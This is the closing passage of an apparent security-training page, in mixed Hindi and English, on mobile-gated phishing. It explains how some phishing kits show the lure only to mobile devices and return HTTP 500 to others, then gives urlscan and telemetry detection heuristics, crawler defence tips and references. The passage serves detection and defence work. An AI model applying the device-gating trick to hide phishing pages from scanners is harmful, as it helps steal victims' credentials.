- `is_mobile=false` होने पर subsequent GETs के लिए 500 (या placeholder) लौटाता है; phishing केवल `true` होने पर serve करता है।

Hunting और detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: sequence of `GET /static/detect_device.js` → `POST /detect` → non‑mobile के लिए HTTP 500; legitimate mobile victim paths 200 के साथ follow-on HTML/JS लौटाते हैं।
- Content को exclusively `ontouchstart` या similar device checks पर condition करने वाले pages को block या scrutinize करें।

Defence tips:
- Gated content reveal करने के लिए crawlers को mobile-like fingerprints और JS enabled के साथ execute करें।
- `POST /detect` के बाद suspicious 500 responses पर alert करें, खासकर newly registered domains पर।

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
